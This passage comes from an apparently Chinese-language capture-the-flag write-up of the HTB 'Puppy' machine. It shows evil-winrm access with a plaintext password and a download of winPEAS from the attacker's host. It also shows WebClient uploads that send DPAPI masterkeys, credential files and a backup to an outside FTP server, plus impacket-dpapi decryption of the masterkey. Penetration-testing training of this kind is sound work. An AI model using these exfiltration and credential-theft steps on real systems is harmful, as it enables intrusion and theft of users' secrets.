class="line">┌──(root㉿kali)-[/myift/…/8/1/1/2]</span><br><span class="line">└─# evil-winrm -i dc.puppy.htb -u adam.silver -p Password@987                                                         </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\Documents&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\adam.silver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-r---         2/28/2025  12:31 PM                3D Objects</span><br><span class="line">d-r---         2/28/2025  12:31 PM                Contacts</span><br><span class="line">d-r---         3/12/2025  12:09 PM                Desktop</span><br><span class="line">d-r---          3/5/2025  10:16 AM                Documents</span><br><span class="line">d-r---         2/28/2025  12:31 PM                Downloads</span><br><span class="line">d-r---         2/28/2025  12:31 PM                Favorites</span><br><span class="line">d-r---         2/28/2025  12:31 PM                Links</span><br><span class="line">d-r---         2/28/2025  12:31 PM                Music</span><br><span class="line">d-r---         2/28/2025  12:31 PM                Pictures</span><br><span class="line">d-r---         2/28/2025  12:31 PM                Saved Games</span><br><span class="line">d-r---         2/28/2025  12:31 PM                Searches</span><br><span class="line">d-r---         2/28/2025  12:31 PM                Videos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; cd Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\adam.silver\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk</span><br><span class="line">-ar---         7/25/2025   7:11 AM             34 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\Desktop&gt; type user.txt</span><br><span class="line">2d8************************</span><br></pre></td></tr></table></figure><p>发现一个Microsoft Edge浏览器的链接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft Edge 浏览器会将用户保存的密码、Cookies 等敏感信息加密存储在本地文件中（例如在 `C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Edge\User Data\Default\Login Data` 和 `Cookies` 文件中）。</span><br><span class="line"></span><br><span class="line">这些文件中的数据就是由 DPAPI 加密的。</span><br></pre></td></tr></table></figure><p>我们上传一个Winpeas扫一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\Documents&gt; (New-Object Net.WebClient).DownloadFile(&#x27;http://10.10.14.41:8888/winPEASx64.exe&#x27;,&#x27;C:\Users\adam.silver\desktop\winPEASx64.exe&#x27;)</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\Documents&gt; cd C:\Users\adam.silver\desktop\</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\adam.silver\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk</span><br><span class="line">-ar---         7/25/2025   7:11 AM             34 user.txt</span><br><span class="line">-a----         7/25/2025   9:21 AM         441344 winPEASx64.exe</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\desktop&gt; ./winPEASx64.exe</span><br><span class="line">ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run &#x27;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#x27; and then start a new CMD</span><br><span class="line">   Creating Dynamic lists, this could take a while, please wait...</span><br><span class="line">   - Checking if domain...</span><br><span class="line">   - Getting Win32_UserAccount info...</span><br><span class="line">Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied</span><br><span class="line">   at System.Management.ThreadDispatch.Start()                                                                                                             </span><br><span class="line">   at System.Management.ManagementScope.Initialize()                                                                                                       </span><br><span class="line">   at System.Management.ManagementObjectSearcher.Initialize()                                                                                              </span><br><span class="line">   at System.Management.ManagementObjectSearcher.Get()                                                                                                     </span><br><span class="line">   at b9.by()                                                                                                                                              </span><br><span class="line">   - Creating current user groups list...</span><br><span class="line">   - Creating active users list...</span><br><span class="line">  [X] Exception: System.NullReferenceException: Object reference not set to an instance of an object.</span><br><span class="line">   at cc.a(Boolean A_0, Boolean A_1, Boolean A_2, Boolean A_3, Boolean A_4)                                                                                </span><br><span class="line">   - Creating disabled users list...</span><br><span class="line">  [X] Exception: System.NullReferenceException: Object reference not set to an instance of an object.</span><br><span class="line">   at cc.a(Boolean A_0, Boolean A_1, Boolean A_2, Boolean A_3, Boolean A_4)                                                                                </span><br><span class="line">   - Admin users list...</span><br><span class="line">  [X] Exception: System.NullReferenceException: Object reference not set to an instance of an object.</span><br><span class="line">   at cc.a(Boolean A_0, Boolean A_1, Boolean A_2, Boolean A_3, Boolean A_4)                                                                                </span><br><span class="line"></span><br><span class="line">             *((,.,/((((((((((((((((((((/,  */                                                                                                             </span><br><span class="line">      ,/*,..*((((((((((((((((((((((((((((((((((,                                                                                                           </span><br><span class="line">    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*                                                                                                        </span><br><span class="line">    ((((((((((((((((**********/########## .(* ,(((((((                                                                                                     </span><br><span class="line">    (((((((((((/********************/####### .(. (((((((                                                                                                   </span><br><span class="line">    ((((((..******************/@@@@@/***/###### ./(((((((                                                                                                  </span><br><span class="line">    ,,....********************@@@@@@@@@@(***,#### .//((((((                                                                                                </span><br><span class="line">    , ,..********************/@@@@@%@@@@/********##((/ /((((                         </span><br></pre></td></tr></table></figure><p>…..</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">     C:\Users\adam.silver\Desktop\DFBE70A7E5CC19A398EBF1B96859CE5D</span><br><span class="line">     C:\Users\Default User</span><br><span class="line">     C:\Users\Default</span><br><span class="line">     C:\Users\All Users</span><br><span class="line">     C:\Users\Default</span><br><span class="line">     C:\Users\All Users</span><br><span class="line">     C:\Users\All Users\ntuser.pol</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250726101524330.png" alt="image-20250726101524330"></p><h4 id="DPAPI泄露-破解masterkey"><a href="#DPAPI泄露-破解masterkey" class="headerlink" title="DPAPI泄露,破解masterkey"></a>DPAPI泄露,破解masterkey</h4><p>发现了C:\Users\adam.silver\Desktop\DFBE70A7E5CC19A398EBF1B96859CE5D这一种隐藏文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ChildItem -Hidden C:\Users\adam.silver\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line">Get-ChildItem C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\</span><br><span class="line">Get-ChildItem C:\Users\adam.silver\AppData\Local\Microsoft\Protect\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\adam.silver\AppData\Local\Microsoft\Protect\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1105</span><br><span class="line">Get-ChildItem -Hidden C:\Users\adam.silver\AppData\Local\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1105</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\desktop&gt; Get-ChildItem -Hidden C:\Users\adam.silver\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\desktop&gt; Get-ChildItem C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d---s-         2/28/2025  12:31 PM                S-1-5-21-1487982659-1829050783-2281216199-1105</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\desktop&gt; Get-ChildItem C:\Users\adam.silver\AppData\Local\Microsoft\Protect\</span><br><span class="line">Cannot find path &#x27;C:\Users\adam.silver\AppData\Local\Microsoft\Protect\&#x27; because it does not exist.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ Get-ChildItem C:\Users\adam.silver\AppData\Local\Microsoft\Protect\</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (C:\Users\adam.s...rosoft\Protect\:String) [Get-ChildItem], ItemNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\desktop&gt; Get-ChildItem -Hidden C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a-hs-         2/28/2025  12:31 PM             24 CREDHIST</span><br><span class="line">-a-hs-         2/28/2025  12:31 PM             76 SYNCHIST</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\desktop&gt; Get-ChildItem -Hidden C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1105</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1105</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a-hs-         2/28/2025  12:31 PM            740 1038bdea-4935-41a8-a224-9b3720193c86</span><br><span class="line">-a-hs-         2/28/2025  12:31 PM            896 BK-PUPPY</span><br><span class="line">-a-hs-         2/28/2025  12:31 PM             24 Preferred</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\desktop&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功找到了 <code>adam.silver</code> 用户的 DPAPI 主密钥文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/1038bdea-4935-41a8-a224-9b3720193c86&#x27;, &#x27;C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1105\1038bdea-4935-41a8-a224-9b3720193c86&#x27;)</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\Documents&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/DFBE70A7E5CC19A398EBF1B96859CE5D-DESKTOP&#x27;, &#x27;C:\Users\adam.silver\Desktop\DFBE70A7E5CC19A398EBF1B96859CE5D&#x27;)</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/BK-PUPPY&#x27;, &#x27;C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1105\BK-PUPPY&#x27;)</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/Preferred&#x27;, &#x27;C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1105\Preferred&#x27;)</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/DFBE70A7E5CC19A398EBF1B96859CE5D&#x27;,&#x27;C:\Users\adam.silver\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&#x27;)</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/CREDHIST&#x27;, &#x27;C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\CREDHIST&#x27;)</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/SYNCHIST&#x27;, &#x27;C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\SYNCHIST&#x27;)</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>copy下来后解一下DPAPI</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/srv/ftp/incoming]</span><br><span class="line">└─# impacket-dpapi masterkey -t puppy.htb/adam.silver:&#x27;Password@987&#x27;@10.10.11.70 -file 1038bdea-4935-41a8-a224-9b3720193c86    </span><br><span class="line"></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[MASTERKEYFILE]</span><br><span class="line">Version     :        2 (2)</span><br><span class="line">Guid        : 1038bdea-4935-41a8-a224-9b3720193c86</span><br><span class="line">Flags       :        0 (0)</span><br><span class="line">Policy      :        0 (0)</span><br><span class="line">MasterKeyLen: 00000088 (136)</span><br><span class="line">BackupKeyLen: 00000068 (104)</span><br><span class="line">CredHistLen : 00000000 (0)</span><br><span class="line">DomainKeyLen: 00000174 (372)</span><br><span class="line"></span><br><span class="line">Decrypted key using rpc call</span><br><span class="line">Decrypted key: 0x67c93a5831a5d17bae13deb6ef3324f5c97abd363d8f146f5ac79f07fb2b2c0eb21433fcf211c15af4e79c1c72a512d3c8f181433b1fa50e78e7e146c27230ae</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到了<code>adam.silver</code> 用户的明文 DPAPI 主密钥,接下来去桌面发现的DPAPI文件，和CREDHIST文件加密文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/srv/ftp/incoming]</span><br><span class="line">└─# impacket-dpapi credential -file DFBE70A7E5CC19A398EBF1B96859CE5D-DESKTOP -key &#x27;0x67c93a5831a5d17bae13deb6ef3324f5c97abd363d8f146f5ac79f07fb2b2c0eb21433fcf211c15af4e79c1c72a512d3c8f181433b1fa50e78e7e146c27230ae&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[CREDENTIAL]</span><br><span class="line">LastWritten : 2025-02-28 20:31:23</span><br><span class="line">Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)</span><br><span class="line">Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)</span><br><span class="line">Type        : 0x00000001 (CRED_TYPE_GENERIC)</span><br><span class="line">Target      : WindowsLive:target=virtualapp/didlogical</span><br><span class="line">Description : PersistedCredential</span><br><span class="line">Unknown     : </span><br><span class="line">Username    : 02pjquuelmoskags</span><br><span class="line">Unknown     : </span><br><span class="line"></span><br><span class="line">KeyWord : Microsoft_WindowsLive:authstate:0</span><br><span class="line">Data    : </span><br><span class="line"> 0000   01 00 00 00 D0 8C 9D DF  01 15 D1 11 8C 7A 00 C0   .............z..</span><br><span class="line"> 0010   4F C2 97 EB 01 00 00 00  B6 88 C3 E7 CB 39 31 48   O............91H</span><br><span class="line"> 0020   B2 D8 A2 43 4E 14 C2 F4  00 00 00 00 02 00 00 00   ...CN...........</span><br><span class="line"> 0030   00 00 10 66 00 00 00 01  00 00 20 00 00 00 AD 11   ...f...... .....</span><br><span class="line"> 0040   01 2D 5F 16 26 ED 21 21  B2 5B 69 94 4F 4C 18 98   .-_.&amp;.!!.[i.OL..</span><br><span class="line"> 0050   A4 8F B8 2C 6F 04 A3 E9  B7 16 FE C3 24 06 00 00   ...,o.......$...</span><br><span class="line"> 0060   00 00 0E 80 00 00 00 02  00 00 20 00 00 00 A6 BE   .......... .....</span><br><span class="line"> 0070   8A 4F D7 AE 5B 64 61 F1  6E A4 34 59 E5 6E D8 91   .O..[da.n.4Y.n..</span><br><span class="line"> 0080   9D 61 5D C8 AA 44 B5 34  95 CF 1C BE 93 B2 90 1E   .a]..D.4........</span><br><span class="line"> 0090   00 00 8E 0A 17 56 03 8B  3E A2 60 68 B2 3B 30 B9   .....V..&gt;.`h.;0.</span><br><span class="line"> 00a0   9E F0 18 5A 0A FC 60 85  24 03 C6 BA F0 54 94 AC   ...Z..`.$....T..</span><br><span class="line"> 00b0   F5 93 29 47 15 4B 12 07  27 C4 C8 1C D0 D1 6A 3A   ..)G.K..&#x27;.....j:</span><br><span class="line"> 00c0   3C F8 D1 43 58 ED C2 DB  3A 17 07 95 A0 A0 30 89   &lt;..CX...:.....0.</span><br><span class="line"> 00d0   44 F0 BF 74 A2 27 11 EF  E3 20 3E B0 2E 4D 6F 74   D..t.&#x27;... &gt;..Mot</span><br><span class="line"> 00e0   FC 17 26 20 FD 80 3C 01  AD 5A A7 E9 C0 E0 9F C1   ..&amp; ..&lt;..Z......</span><br><span class="line"> 00f0   D3 63 4E 36 B0 75 25 6C  8D ED 98 AD 5F 9C C7 D8   .cN6.u%l...._...</span><br><span class="line">KeyWord : Microsoft_WindowsLive:authstate:1</span><br><span class="line">Data    : </span><br><span class="line"> 0000   DF EE D6 87 77 32 4D EC  8A 4A 56 65 55 23 14 C2   ....w2M..JVeU#..</span><br><span class="line"> 0010   C8 2F 4F 7D 35 27 61 B3  03 60 65 AD 0A 99 E9 37   ./O&#125;5&#x27;a..`e....7</span><br><span class="line"> 0020   E5 5C 04 B2 FC 72 1F B0  6F 8F E8 8B A2 D6 53 06   .\...r..o.....S.</span><br><span class="line"> 0030   2E 05 21 D2 9C 2F CE 47  E8 34 55 B7 54 19 53 0A   ..!../.G.4U.T.S.</span><br><span class="line"> 0040   12 FE 39 1C BA 9E C4 48  55 6A B8 79 50 B6 B1 88   ..9....HUj.yP...</span><br><span class="line"> 0050   24 B0 4F 42 2F B0 38 98  C1 B0 6F FC 7F C0 86 FD   $.OB/.8...o.....</span><br><span class="line"> 0060   49 45 8C 04 7E DB 74 62  4C 3F EC 81 3D 39 A7 C3   IE..~.tbL?..=9..</span><br><span class="line"> 0070   D7 08 7E 7E 17 AD CE 81  9C AA BE 29 5A 8F AC 8A   ..~~.......)Z...</span><br><span class="line">.........</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/srv/ftp/incoming]</span><br><span class="line">└─# impacket-dpapi credential -file DFBE70A7E5CC19A398EBF1B96859CE5D -key &#x27;0x67c93a5831a5d17bae13deb6ef3324f5c97abd363d8f146f5ac79f07fb2b2c0eb21433fcf211c15af4e79c1c72a512d3c8f181433b1fa50e78e7e146c27230ae&#x27; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[CREDENTIAL]</span><br><span class="line">LastWritten : 2025-03-08 15:26:44</span><br><span class="line">Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)</span><br><span class="line">Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)</span><br><span class="line">Type        : 0x00000001 (CRED_TYPE_GENERIC)</span><br><span class="line">Target      : WindowsLive:target=virtualapp/didlogical</span><br><span class="line">Description : PersistedCredential</span><br><span class="line">Unknown     : </span><br><span class="line">Username    : 02pjquuelmoskags</span><br><span class="line">Unknown     : </span><br><span class="line"></span><br><span class="line">KeyWord : Microsoft_WindowsLive:authstate:0</span><br><span class="line">Data    : </span><br><span class="line"> 0000   01 00 00 00 D0 8C 9D DF  01 15 D1 11 8C 7A 00 C0   .............z..</span><br><span class="line"> 0010   4F C2 97 EB 01 00 00 00  B6 88 C3 E7 CB 39 31 48   O............91H</span><br><span class="line"> 0020   B2 D8 A2 43 4E 14 C2 F4  00 00 00 00 02 00 00 00   ...CN...........</span><br><span class="line"> 0030   00 00 10 66 00 00 00 01  00 00 20 00 00 00 2A 4C   ...f...... ...*L</span><br><span class="line"> 0040   BC 96 1D 48 07 9A 8C BF  2D CF DB E4 10 68 AD 6A   ...H....-....h.j</span><br><span class="line"> 0050   65 85 D5 C8 77 36 31 D2  40 76 A0 7A 5D 94 00 00   e...w61.@v.z]...</span><br><span class="line"> 0060   00 00 0E 80 00 00 00 02  00 00 20 00 00 00 E3 8A   .......... .....</span><br><span class="line"> 0070   64 01 07 DE BC 90 3A E9  1D FB 4E D7 F8 01 5F 0F   d.....:...N..._.</span><br><span class="line"> 0080   F4 59 E9 B5 1C 9B E3 F3  58 8F 45 AA B8 C6 90 1E   .Y......X.E.....</span><br><span class="line"> 0090   00 00 16 87 3F 65 7E 4E  13 D2 70 80 38 46 BE B6   ....?e~N..p.8F..</span><br><span class="line"> 00a0   93 16 01 78 FA 73 3C C7  D8 BC FE D0 7A 34 A6 0A   ...x.s&lt;.....z4..</span><br><span class="line"> 00b0   9D 7F F7 A1 8B 39 A1 B8  C3 91 97 2F 6B 2F D9 A3   .....9...../k/..</span><br><span class="line"> 00c0   1A C5 15 29 9F 4A CA 08  20 82 36 E4 BA A0 E5 CA   ...).J.. .6.....</span><br><span class="line"> 00d0   F8 09 0B 03 71 C1 F4 C0  1D B1 CF 47 97 02 C9 14   ....q......G....</span><br><span class="line"> 00e0   D5 9B 7A 9A 95 13 66 B5  40 FB 85 B7 94 07 31 03   ..z...f.@.....1.</span><br><span class="line"> 00f0   25 FD A5 C3 0A 3C 3C 7A  EA 12 69 DD 57 44 59 7A   %....&lt;&lt;z..i.WDYz</span><br><span class="line">KeyWord : Microsoft_WindowsLive:authstate:1</span><br><span class="line">Data    : </span><br><span class="line"> 0000   5B 57 12 1B 52 63 BD 78  A1 BB AC 5C 38 76 21 4D   [W..Rc.x...\8v!M</span><br><span class="line"> 0010   15 48 F0 7E 83 87 F7 3A  C0 08 18 8C D3 2D 06 FE   .H.~...:.....-..</span><br><span class="line"> 0020   D1 96 D1 F6 6C 91 05 90  78 3A 68 5E 01 86 41 71   ....l...x:h^..Aq</span><br><span class="line"> 0030   50 C0 45 75 A8 36 34 60  87 1F 63 80 A1 04 08 E0   P.Eu.64`..c.....</span><br><span class="line"> 0040   E6 59 A8 44 C0 52 9A 14  25 E4 23 D0 8A B0 F9 19   .Y.D.R..%.#.....</span><br><span class="line"> 0050   5F 99 11 4E 51 8F 23 9D  A6 EB 09 05 4D 72 27 00   _..NQ.#.....Mr&#x27;.</span><br><span class="line"> 0060   CC 7D 20 04 E5 6F 30 87  67 1F F1 41 DA D5 F7 39   .&#125; ..o0.g..A...9</span><br><span class="line"> 0070   03 81 74 6C 49 74 56 4E  71 F2 F9 09 21 F5 7F 13   ..tlItVNq...!...</span><br><span class="line"> 0080   3A 06 1A E7 71 C0 54 6B  F3 4A 7D 64 04 3D 42 DB   :...q.Tk.J&#125;d.=B.</span><br><span class="line"> 0090   86 11 15 C6 D0 80 B5 41  38 C2 FD 06 61 D1 30 AC   .......A8...a.0.</span><br><span class="line"> 00a0   30 C6 D8 A8 6E C0 82 88  88 25 E0 E1 7B 52 25 B0   0...n....%..&#123;R%.</span><br><span class="line"> 00b0   2F 75 87 EC 64 46 03 9E  63 F6 CC 73 91 78 7A 7C   /u..dF..c..s.xz|</span><br><span class="line"> 00c0   E5 AB 76 A7 DE 68 A3 96  FA CF A8 FF 0A CF C1 9A   ..v..h..........</span><br><span class="line"> 00d0   D4 FA 91 A8 1D 10 87 E5  93 C2 8F 18 EB 1B 50 33   ..............P3</span><br><span class="line"> 00e0   72 9B A5 6C 30 98 05 FF  28 8D 9C 6D F8 B4 CD 7B   r..l0...(..m...&#123;</span><br><span class="line"> 00f0   16 F1 06 8C 85 3C C9 55  4B 8F 67 4D C9 D1 30 17   .....&lt;.UK.gM..0.</span><br><span class="line">.........</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是一堆没有用的东西….</p><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>我们继续翻一下目录</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250726200752159.png" alt="image-20250726200752159"></p><p>发现备份文件</p><p>我们copy下来看一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/site-backup-2024-12-30.zip&#x27;, &#x27;C:\backups\site-backup-2024-12-30.zip&#x27;)</span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/1.txt&#x27;, &#x27;C:\backups\1.txt&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250726201618563.png" alt="image-20250726201618563"></p><p>发现之前分析的<a href="mailto:&#x53;&#84;&#x45;&#80;&#72;&#x2e;&#67;&#79;&#x4f;&#80;&#69;&#x52;&#64;&#x50;&#85;&#80;&#80;&#89;&#x2e;&#x48;&#84;&#x42;">STEPH.COOPER@PUPPY.HTB</a>用户的账密</p><h4 id="DPAPI泄露-破解masterkey-1"><a href="#DPAPI泄露-破解masterkey-1" class="headerlink" title="DPAPI泄露,破解masterkey"></a>DPAPI泄露,破解masterkey</h4><p>登陆后和上面操作一样查询DPAPI</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107</span><br><span class="line">Get-ChildItem C:\Users\steph.cooper\AppData\Local\Microsoft\Protect\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Local\Microsoft\Protect\</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\Documents&gt; Get-ChildItem C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\Documents&gt; Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407</span><br><span class="line">-a-hs-         2/23/2025   2:36 PM             24 Preferred</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\Documents&gt; Get-ChildItem C:\Users\steph.cooper\AppData\Local\Microsoft\Protect\</span><br><span class="line">Cannot find path &#x27;C:\Users\steph.cooper\AppData\Local\Microsoft\Protect\&#x27; because it does not exist.</span><br><span class="line">At line:1 